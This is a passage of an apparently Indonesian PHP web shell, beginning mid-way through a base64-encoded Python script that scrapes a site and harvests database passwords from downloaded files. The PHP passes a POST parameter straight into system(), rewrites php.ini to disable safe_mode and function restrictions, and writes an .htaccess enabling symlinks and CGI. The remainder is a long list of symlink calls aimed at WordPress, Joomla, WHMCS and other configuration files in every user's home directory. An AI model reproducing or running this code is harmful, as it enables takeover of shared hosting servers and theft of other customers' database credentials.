mIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea style=\"color: lime; background-color: black\" cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
symlink('/home/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home/'.$user.'/public_html/config/config.php',$kola.' ~~ config.txt');
symlink('/home/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
symlink('/home2/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home2/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home2/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home2/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home2/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home2/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home2/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home2/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home2/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home2/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home2/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home2/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home2/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home2/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home2/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home2/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home2/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home2/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home2/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home2/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home2/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home2/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home2/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home2/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home2/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home2/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home2/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home2/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home2/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home2/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home2/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home2/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home2/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home2/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home2/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home2/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home2/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home2/'.$user.'/public_html/config/config.php',$kola.' ~~ config.txt');
symlink('/home2/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home2/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home2/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home2/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home2/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home2/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home2/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home2/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home2/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home2/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home2/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home2/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home2/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home2/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home2/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home2/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home2/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home2/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home2/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home2/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home2/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home2/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home2/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home2/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home2/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home2/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home2/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home2/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home2/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
